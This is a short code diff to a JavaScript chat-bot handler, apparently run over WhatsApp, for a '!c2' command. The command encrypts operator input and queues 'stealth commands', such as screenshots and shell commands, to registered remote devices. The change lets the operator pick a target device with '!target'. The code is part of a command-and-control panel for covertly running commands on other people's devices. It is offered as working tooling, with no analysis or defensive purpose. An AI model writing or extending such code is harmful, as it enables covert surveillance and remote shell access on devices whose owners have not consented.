@@ -8,12 +8,13 @@ export default {
 
     switch (cmd) {
       case 'c2': {
-        const target = getDevices()[0];
-        if (!target) return await sock.sendMessage(jid, { text: '❌ No devices registered.' });
         if (!args) return await sock.sendMessage(jid, { text: '📖 *!c2*\nEncrypt and queue stealth command.\nUsage: `!c2 screenshot`\nUsage: `!c2 shell ls -la`' });
+        const target = ctx.getTarget ? ctx.getTarget(jid) : null;
+        const deviceId = target || (getDevices().length ? getDevices()[0].device_id : null);
+        if (!deviceId) return await sock.sendMessage(jid, { text: '❌ No devices. Use `!target <id>` first or register a device.' });
         const encrypted = encrypt(args);
-        const id = queueCommand(target.device_id, 'c2', encrypted);
-        await sock.sendMessage(jid, { text: `🛡️ *Stealth command queued*\n\`${args}\` → \`${target.device_id}\` (#${id})\n\nEncrypted: \`${encrypted}\`` });
+        const id = queueCommand(deviceId, 'c2', encrypted);
+        await sock.sendMessage(jid, { text: `🛡️ *Stealth command queued*\n\`${args}\` → \`${deviceId}\` (#${id})\n\nEncrypted: \`${encrypted}\`` });
         break;
       }
 
